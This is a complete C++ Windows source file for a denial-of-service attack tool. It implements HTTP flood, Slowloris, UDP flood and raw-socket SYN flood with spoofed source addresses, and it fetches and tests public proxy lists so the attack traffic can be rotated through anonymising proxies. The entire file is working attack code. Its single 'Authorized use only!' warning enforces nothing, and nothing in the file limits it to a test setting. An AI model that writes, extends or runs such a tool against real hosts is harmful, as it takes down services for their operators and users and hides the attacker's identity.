#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <string>
#include <vector>
#include <cstring>
#include <sstream>
#include <algorithm>
#include <ctime>
#include <fstream>
#include <iomanip>
#include <map>
#include <queue>
#include <random>
#include <thread>
#include <chrono>
#include <mutex>
#include <atomic>
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment(lib, "ws2_32.lib")

#define BUFFER_SIZE 131072
#define MAX_THREADS 100

using namespace std;

struct ProxyInfo {
    string host;
    int port;
    bool working;
    int responseTime;
    ProxyInfo() : port(0), working(false), responseTime(0) {}
};

struct Target {
    string ip;
    string host;
    int port;
    int duration;
    int threads;
    string method;
    Target() : port(80), duration(10), threads(1), method("http") {}
};

struct Stats {
    atomic<long long> requests;
    atomic<long long> bytes;
    atomic<long long> conns;
    atomic<bool> running;
    Stats() : requests(0), bytes(0), conns(0), running(false) {}
};

Target target;
Stats stats;
vector<ProxyInfo> proxyList;
ofstream logFile;
mutex logMutex;
mutex proxyMutex;
random_device rd;
mt19937 gen(rd());
uniform_int_distribution<> portDist(1, 65535);
uniform_int_distribution<> byteDist(0, 255);
int currentProxyIndex = 0;

vector<string> proxySources = {
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all",
    "https://www.proxy-list.download/api/v1/get?type=http"
};

void writeLog(const string& msg) {
    lock_guard<mutex> lock(logMutex);
    time_t now = time(nullptr);
    string t = ctime(&now);
    t.pop_back();
    logFile << "[" << t << "] " << msg << endl;
    logFile.flush();
}

void logInfo(const string& msg) {
    cout << "[*] " << msg << endl;
    writeLog("[INFO] " + msg);
}

void logSuccess(const string& msg) {
    cout << "[+] " << msg << endl;
    writeLog("[SUCCESS] " + msg);
}

void logError(const string& msg) {
    cout << "[-] " << msg << endl;
    writeLog("[ERROR] " + msg);
}

void logWarning(const string& msg) {
    cout << "[!] " << msg << endl;
    writeLog("[WARNING] " + msg);
}

bool resolveHost(const string& host, string& ip) {
    struct hostent* he = gethostbyname(host.c_str());
    if (!he) return false;
    struct in_addr addr;
    memcpy(&addr, he->h_addr_list[0], sizeof(addr));
    ip = inet_ntoa(addr);
    return true;
}

string randomString(int len) {
    string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    string result;
    for (int i = 0; i < len; i++) {
        result += chars[rand() % chars.length()];
    }
    return result;
}

string randomUA() {
    vector<string> agents = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36"
    };
    return agents[rand() % agents.size()];
}

ProxyInfo getProxy() {
    lock_guard<mutex> lock(proxyMutex);
    if (proxyList.empty()) return ProxyInfo();
    currentProxyIndex = (currentProxyIndex + 1) % proxyList.size();
    return proxyList[currentProxyIndex];
}

string httpGet(const string& url) {
    string host, path;
    size_t start = 0;

    if (url.find("http://") == 0) start = 7;
    else if (url.find("https://") == 0) start = 8;

    size_t slash = url.find('/', start);
    if (slash != string::npos) {
        host = url.substr(start, slash - start);
        path = url.substr(slash);
    }
    else {
        host = url.substr(start);
        path = "/";
    }

    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) return "";

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(80);

    string ip;
    if (!resolveHost(host, ip)) {
        closesocket(sock);
        return "";
    }

    addr.sin_addr.s_addr = inet_addr(ip.c_str());

    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        closesocket(sock);
        return "";
    }

    string request = "GET " + path + " HTTP/1.1\r\n";
    request += "Host: " + host + "\r\n";
    request += "Connection: close\r\n";
    request += "\r\n";

    send(sock, request.c_str(), request.length(), 0);

    char buffer[BUFFER_SIZE];
    string response;
    int n;
    while ((n = recv(sock, buffer, BUFFER_SIZE - 1, 0)) > 0) {
        buffer[n] = '\0';
        response += buffer;
        if (response.length() > 50000) break;
    }

    closesocket(sock);

    size_t body_start = response.find("\r\n\r\n");
    if (body_start != string::npos) {
        return response.substr(body_start + 4);
    }

    return response;
}

void parseProxy(const string& content) {
    stringstream ss(content);
    string line;

    while (getline(ss, line)) {
        if (line.empty()) continue;

        size_t colon = line.find(':');
        if (colon == string::npos) continue;

        ProxyInfo p;
        p.host = line.substr(0, colon);

        size_t colon2 = line.find(':', colon + 1);
        if (colon2 != string::npos) {
            p.port = stoi(line.substr(colon + 1, colon2 - colon - 1));
        }
        else {
            size_t space = line.find(' ', colon + 1);
            if (space != string::npos) {
                p.port = stoi(line.substr(colon + 1, space - colon - 1));
            }
            else {
                p.port = stoi(line.substr(colon + 1));
            }
        }

        if (p.port > 0 && p.port < 65535) {
            proxyList.push_back(p);
        }
    }
}

void fetchProxies() {
    logInfo("Downloading proxy list from " + to_string(proxySources.size()) + " sources");

    for (const string& src : proxySources) {
        logInfo("Fetching: " + src);
        string content = httpGet(src);
        if (!content.empty()) {
            parseProxy(content);
            logSuccess("Got " + to_string(proxyList.size()) + " proxies");
        }
        else {
            logError("Failed: " + src);
        }
        this_thread::sleep_for(chrono::seconds(1));
    }

    logSuccess("Total proxies: " + to_string(proxyList.size()));
}

bool testProxy(ProxyInfo& proxy) {
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) return false;

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(proxy.port);

    string ip;
    if (!resolveHost(proxy.host, ip)) {
        closesocket(sock);
        return false;
    }

    addr.sin_addr.s_addr = inet_addr(ip.c_str());

    auto start = chrono::steady_clock::now();

    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        closesocket(sock);
        return false;
    }

    auto end = chrono::steady_clock::now();
    proxy.responseTime = chrono::duration_cast<chrono::milliseconds>(end - start).count();

    string request = "GET http://httpbin.org/ip HTTP/1.1\r\n";
    request += "Host: httpbin.org\r\n";
    request += "Connection: close\r\n";
    request += "\r\n";

    send(sock, request.c_str(), request.length(), 0);

    char buffer[BUFFER_SIZE];
    string response;
    int n;
    while ((n = recv(sock, buffer, BUFFER_SIZE - 1, 0)) > 0) {
        buffer[n] = '\0';
        response += buffer;
        if (response.length() > 5000) break;
    }

    closesocket(sock);

    if (response.find(proxy.host) != string::npos) {
        proxy.working = true;
        return true;
    }

    return false;
}

void filterProxies() {
    logInfo("Testing " + to_string(proxyList.size()) + " proxies");

    vector<ProxyInfo> working;
    int tested = 0;

    for (ProxyInfo& p : proxyList) {
        tested++;
        cout << "\rTesting: " << tested << "/" << proxyList.size() << " - " << p.host << ":" << p.port << "   " << flush;

        if (testProxy(p)) {
            working.push_back(p);
            cout << endl;
            logSuccess("Working: " + p.host + ":" + to_string(p.port) + " (" + to_string(p.responseTime) + "ms)");
        }

        if (tested % 10 == 0) {
            this_thread::sleep_for(chrono::milliseconds(500));
        }
    }

    cout << endl;
    proxyList = working;

    sort(proxyList.begin(), proxyList.end(), [](const ProxyInfo& a, const ProxyInfo& b) {
        return a.responseTime < b.responseTime;
        });

    logSuccess("Working proxies: " + to_string(proxyList.size()));
}

bool sendViaProxy(const string& request, string& response, int& response_time, ProxyInfo& proxy) {
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) return false;

    int timeout = 10000;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(proxy.port);

    string ip;
    if (!resolveHost(proxy.host, ip)) {
        closesocket(sock);
        return false;
    }

    addr.sin_addr.s_addr = inet_addr(ip.c_str());

    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        closesocket(sock);
        return false;
    }

    string proxy_request = "CONNECT " + target.host + ":" + to_string(target.port) + " HTTP/1.1\r\n";
    proxy_request += "Host: " + target.host + "\r\n";
    proxy_request += "User-Agent: " + randomUA() + "\r\n";
    proxy_request += "Proxy-Connection: Keep-Alive\r\n";
    proxy_request += "\r\n";

    if (send(sock, proxy_request.c_str(), proxy_request.length(), 0) == SOCKET_ERROR) {
        closesocket(sock);
        return false;
    }

    char buffer[BUFFER_SIZE];
    memset(buffer, 0, BUFFER_SIZE);
    int n = recv(sock, buffer, BUFFER_SIZE - 1, 0);
    string response_connect(buffer);

    if (response_connect.find("200") == string::npos) {
        closesocket(sock);
        return false;
    }

    clock_t start = clock();
    if (send(sock, request.c_str(), request.length(), 0) == SOCKET_ERROR) {
        closesocket(sock);
        return false;
    }

    response.clear();
    while ((n = recv(sock, buffer, BUFFER_SIZE - 1, 0)) > 0) {
        buffer[n] = '\0';
        response += buffer;
        if (response.length() >= BUFFER_SIZE - 1024) break;
    }

    clock_t end = clock();
    response_time = (int)((double)(end - start) * 1000 / CLOCKS_PER_SEC);

    closesocket(sock);
    return true;
}

bool sendDirect(const string& request, string& response, int& response_time) {
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) return false;

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(target.port);

    string ip;
    if (!resolveHost(target.host, ip)) {
        closesocket(sock);
        return false;
    }

    addr.sin_addr.s_addr = inet_addr(ip.c_str());

    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        closesocket(sock);
        return false;
    }

    clock_t start = clock();
    if (send(sock, request.c_str(), request.length(), 0) == SOCKET_ERROR) {
        closesocket(sock);
        return false;
    }

    response.clear();
    char buffer[BUFFER_SIZE];
    int n;
    while ((n = recv(sock, buffer, BUFFER_SIZE - 1, 0)) > 0) {
        buffer[n] = '\0';
        response += buffer;
        if (response.length() >= BUFFER_SIZE - 1024) break;
    }

    clock_t end = clock();
    response_time = (int)((double)(end - start) * 1000 / CLOCKS_PER_SEC);

    closesocket(sock);
    return true;
}

void httpFlood() {
    while (stats.running) {
        ProxyInfo proxy = getProxy();

        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) continue;

        int timeout = 5000;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));

        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));

        if (proxy.host.empty()) {
            addr.sin_family = AF_INET;
            addr.sin_port = htons(target.port);
            string ip;
            if (!resolveHost(target.host, ip)) {
                closesocket(sock);
                continue;
            }
            addr.sin_addr.s_addr = inet_addr(ip.c_str());

            if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) != 0) {
                closesocket(sock);
                continue;
            }
        }
        else {
            addr.sin_family = AF_INET;
            addr.sin_port = htons(proxy.port);
            string ip;
            if (!resolveHost(proxy.host, ip)) {
                closesocket(sock);
                continue;
            }
            addr.sin_addr.s_addr = inet_addr(ip.c_str());

            if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) != 0) {
                closesocket(sock);
                continue;
            }

            string proxy_connect = "CONNECT " + target.host + ":" + to_string(target.port) + " HTTP/1.1\r\n";
            proxy_connect += "Host: " + target.host + "\r\n";
            proxy_connect += "User-Agent: " + randomUA() + "\r\n";
            proxy_connect += "\r\n";

            send(sock, proxy_connect.c_str(), proxy_connect.length(), 0);

            char buf[1024];
            recv(sock, buf, sizeof(buf), 0);
        }

        string path = "/" + randomString(rand() % 20 + 5);
        string query = "?" + randomString(8) + "=" + randomString(8);
        string ua = randomUA();
        string referer = "http://" + target.host + "/";

        string request = "GET " + path + query + " HTTP/1.1\r\n";
        request += "Host: " + target.host + "\r\n";
        request += "User-Agent: " + ua + "\r\n";
        request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n";
        request += "Accept-Language: en-US,en;q=0.5\r\n";
        request += "Accept-Encoding: gzip, deflate\r\n";
        request += "Referer: " + referer + "\r\n";
        request += "Connection: keep-alive\r\n";
        request += "Cache-Control: no-cache\r\n";
        request += "Pragma: no-cache\r\n";
        request += "\r\n";

        send(sock, request.c_str(), request.length(), 0);

        stats.requests++;
        stats.bytes += request.length();
        stats.conns++;

        closesocket(sock);

        this_thread::sleep_for(chrono::milliseconds(rand() % 100));
    }
}

void slowloris() {
    vector<SOCKET> sockets;

    while (stats.running && sockets.size() < target.threads) {
        ProxyInfo proxy = getProxy();

        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) continue;

        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));

        if (proxy.host.empty()) {
            addr.sin_family = AF_INET;
            addr.sin_port = htons(target.port);
            string ip;
            if (!resolveHost(target.host, ip)) {
                closesocket(sock);
                continue;
            }
            addr.sin_addr.s_addr = inet_addr(ip.c_str());

            if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) != 0) {
                closesocket(sock);
                continue;
            }
        }
        else {
            addr.sin_family = AF_INET;
            addr.sin_port = htons(proxy.port);
            string ip;
            if (!resolveHost(proxy.host, ip)) {
                closesocket(sock);
                continue;
            }
            addr.sin_addr.s_addr = inet_addr(ip.c_str());

            if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) != 0) {
                closesocket(sock);
                continue;
            }

            string proxy_connect = "CONNECT " + target.host + ":" + to_string(target.port) + " HTTP/1.1\r\n";
            proxy_connect += "Host: " + target.host + "\r\n";
            proxy_connect += "User-Agent: " + randomUA() + "\r\n";
            proxy_connect += "\r\n";

            send(sock, proxy_connect.c_str(), proxy_connect.length(), 0);

            char buf[1024];
            recv(sock, buf, sizeof(buf), 0);
        }

        string request = "GET / HTTP/1.1\r\n";
        request += "Host: " + target.host + "\r\n";
        request += "User-Agent: " + randomUA() + "\r\n";

        send(sock, request.c_str(), request.length(), 0);

        sockets.push_back(sock);
        stats.conns++;

        this_thread::sleep_for(chrono::milliseconds(100));
    }

    while (stats.running) {
        for (auto& sock : sockets) {
            string header = "X-Header-" + randomString(5) + ": " + randomString(rand() % 100 + 10) + "\r\n";
            send(sock, header.c_str(), header.length(), 0);
            stats.requests++;
            stats.bytes += header.length();
        }
        this_thread::sleep_for(chrono::seconds(5));
    }

    for (auto& sock : sockets) {
        closesocket(sock);
    }
}

void udpFlood() {
    while (stats.running) {
        ProxyInfo proxy = getProxy();

        SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (sock == INVALID_SOCKET) continue;

        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));

        if (proxy.host.empty()) {
            addr.sin_family = AF_INET;
            addr.sin_port = htons(target.port);
            string ip;
            if (!resolveHost(target.host, ip)) {
                closesocket(sock);
                continue;
            }
            addr.sin_addr.s_addr = inet_addr(ip.c_str());
        }
        else {
            addr.sin_family = AF_INET;
            addr.sin_port = htons(proxy.port);
            string ip;
            if (!resolveHost(proxy.host, ip)) {
                closesocket(sock);
                continue;
            }
            addr.sin_addr.s_addr = inet_addr(ip.c_str());
        }

        char buffer[1400];
        int size = 64 + (rand() % 1300);
        for (int i = 0; i < size; i++) {
            buffer[i] = byteDist(gen);
        }

        sendto(sock, buffer, size, 0, (struct sockaddr*)&addr, sizeof(addr));

        stats.requests++;
        stats.bytes += size;

        closesocket(sock);
        this_thread::sleep_for(chrono::microseconds(100));
    }
}

void synFlood() {
    SOCKET sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        logError("SYN flood requires admin privileges");
        return;
    }

    while (stats.running) {
        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port = htons(target.port);

        string ip;
        if (!resolveHost(target.host, ip)) {
            continue;
        }
        addr.sin_addr.s_addr = inet_addr(ip.c_str());

        char packet[4096];
        memset(packet, 0, sizeof(packet));

        struct ipheader {
            unsigned char ihl : 4, version : 4;
            unsigned char tos;
            unsigned short tot_len;
            unsigned short id;
            unsigned short frag_off;
            unsigned char ttl;
            unsigned char protocol;
            unsigned short check;
            unsigned int saddr;
            unsigned int daddr;
        } *ip_hdr = (struct ipheader*)packet;

        struct tcpheader {
            unsigned short source;
            unsigned short dest;
            unsigned int seq;
            unsigned int ack_seq;
            unsigned char doff : 4, res1 : 4;
            unsigned char fin : 1, syn : 1, rst : 1, psh : 1, ack : 1, urg : 1, ece : 1, cwr : 1;
            unsigned short window;
            unsigned short check;
            unsigned short urg_ptr;
        } *tcp_hdr = (struct tcpheader*)(packet + sizeof(struct ipheader));

        ip_hdr->version = 4;
        ip_hdr->ihl = 5;
        ip_hdr->ttl = 255;
        ip_hdr->protocol = IPPROTO_TCP;
        ip_hdr->saddr = inet_addr(("192.168." + to_string(rand() % 255) + "." + to_string(rand() % 255)).c_str());
        ip_hdr->daddr = inet_addr(ip.c_str());
        ip_hdr->tot_len = htons(sizeof(struct ipheader) + sizeof(struct tcpheader));

        tcp_hdr->source = htons(portDist(gen));
        tcp_hdr->dest = htons(target.port);
        tcp_hdr->seq = rand();
        tcp_hdr->syn = 1;
        tcp_hdr->doff = 5;
        tcp_hdr->window = htons(65535);

        sendto(sock, packet, sizeof(struct ipheader) + sizeof(struct tcpheader), 0,
            (struct sockaddr*)&addr, sizeof(addr));

        stats.requests++;
        stats.bytes += sizeof(struct ipheader) + sizeof(struct tcpheader);

        this_thread::sleep_for(chrono::microseconds(10));
    }

    closesocket(sock);
}

void showStats() {
    auto start = chrono::steady_clock::now();

    while (stats.running) {
        this_thread::sleep_for(chrono::seconds(2));

        auto now = chrono::steady_clock::now();
        auto elapsed = chrono::duration_cast<chrono::seconds>(now - start).count();

        double rate = stats.requests / (elapsed + 1);
        double mbps = (stats.bytes * 8.0 / 1024 / 1024) / (elapsed + 1);

        cout << "\r[" << elapsed << "s] Req:" << stats.requests
            << " | MB:" << stats.bytes / 1024 / 1024
            << " | Mbps:" << fixed << setprecision(1) << mbps
            << " | Rate:" << (int)rate << "/s"
            << " | Conn:" << stats.conns << "    " << flush;
    }
    cout << endl;
}

void runAttack() {
    logInfo("Target: " + target.host + ":" + to_string(target.port));
    logInfo("Method: " + target.method);
    logInfo("Duration: " + to_string(target.duration) + "s");
    logInfo("Threads: " + to_string(target.threads));

    if (!proxyList.empty()) {
        logInfo("Using proxy rotation with " + to_string(proxyList.size()) + " proxies");
    }

    stats.running = true;

    vector<thread> threads;

    if (target.method == "http") {
        for (int i = 0; i < target.threads; i++) {
            threads.emplace_back(httpFlood);
        }
    }
    else if (target.method == "slowloris") {
        threads.emplace_back(slowloris);
    }
    else if (target.method == "udp") {
        for (int i = 0; i < target.threads; i++) {
            threads.emplace_back(udpFlood);
        }
    }
    else if (target.method == "syn") {
        for (int i = 0; i < target.threads; i++) {
            threads.emplace_back(synFlood);
        }
    }

    thread statsThread(showStats);

    this_thread::sleep_for(chrono::seconds(target.duration));

    stats.running = false;

    for (auto& t : threads) {
        if (t.joinable()) t.join();
    }

    if (statsThread.joinable()) statsThread.join();

    logSuccess("Attack completed");
    logInfo("Total requests: " + to_string(stats.requests));
    logInfo("Total bytes: " + to_string(stats.bytes / 1024 / 1024) + " MB");
    logInfo("Total connections: " + to_string(stats.conns));
}

bool parseArgs(int argc, char* argv[]) {
    if (argc < 3) {
        cout << "Usage: " << argv[0] << " -t <target> -m <method> [options]\n";
        cout << "\nMethods:\n";
        cout << "  http      - HTTP flood with proxy rotation\n";
        cout << "  slowloris - Slowloris attack\n";
        cout << "  udp       - UDP flood\n";
        cout << "  syn       - SYN flood (requires admin)\n";
        cout << "\nOptions:\n";
        cout << "  -t <target>   Target IP or domain\n";
        cout << "  -m <method>   Attack method\n";
        cout << "  -p <port>     Target port (default: 80)\n";
        cout << "  -d <sec>      Duration (default: 10)\n";
        cout << "  -c <threads>  Threads (default: 1)\n";
        cout << "  --proxy       Enable proxy rotation\n";
        cout << "\nExamples:\n";
        cout << "  " << argv[0] << " -t example.com -m http -d 60 -c 10 --proxy\n";
        cout << "  " << argv[0] << " -t example.com -m slowloris -p 80 -d 120\n";
        return false;
    }

    bool useProxy = false;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-t") == 0 && i + 1 < argc) {
            target.host = argv[++i];
            if (!resolveHost(target.host, target.ip)) {
                logError("Cannot resolve: " + target.host);
                return false;
            }
        }
        else if (strcmp(argv[i], "-m") == 0 && i + 1 < argc) {
            target.method = argv[++i];
        }
        else if (strcmp(argv[i], "-p") == 0 && i + 1 < argc) {
            target.port = atoi(argv[++i]);
        }
        else if (strcmp(argv[i], "-d") == 0 && i + 1 < argc) {
            target.duration = atoi(argv[++i]);
        }
        else if (strcmp(argv[i], "-c") == 0 && i + 1 < argc) {
            target.threads = atoi(argv[++i]);
            if (target.threads > MAX_THREADS) target.threads = MAX_THREADS;
        }
        else if (strcmp(argv[i], "--proxy") == 0) {
            useProxy = true;
        }
    }

    if (target.host.empty() || target.method.empty()) {
        logError("Target and method required");
        return false;
    }

    if (useProxy && (target.method == "http" || target.method == "slowloris")) {
        fetchProxies();
        if (!proxyList.empty()) {
            filterProxies();
        }
        if (proxyList.empty()) {
            logWarning("No working proxies, continuing without proxy");
        }
    }

    return true;
}

int main(int argc, char* argv[]) {
    SetConsoleOutputCP(CP_UTF8);
    SetConsoleTitle(TEXT("Attack Tool with Proxy Rotation"));

    logFile.open("attack_log.txt", ios::app);
    if (!logFile.is_open()) {
        cout << "Cannot open log file\n";
        return 1;
    }

    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        logError("Winsock failed");
        return 1;
    }

    srand((unsigned int)time(nullptr));

    if (!parseArgs(argc, argv)) {
        WSACleanup();
        logFile.close();
        cout << "\nPress any key...";
        cin.get();
        return 1;
    }

    logWarning("Authorized use only!");
    logWarning("Target: " + target.host + ":" + to_string(target.port));
    logWarning("Method: " + target.method);

    cout << "\nPress Enter to start...";
    cin.get();

    runAttack();

    logFile.close();
    WSACleanup();

    cout << "\nPress any key to exit...";
    cin.get();

    return 0;
}
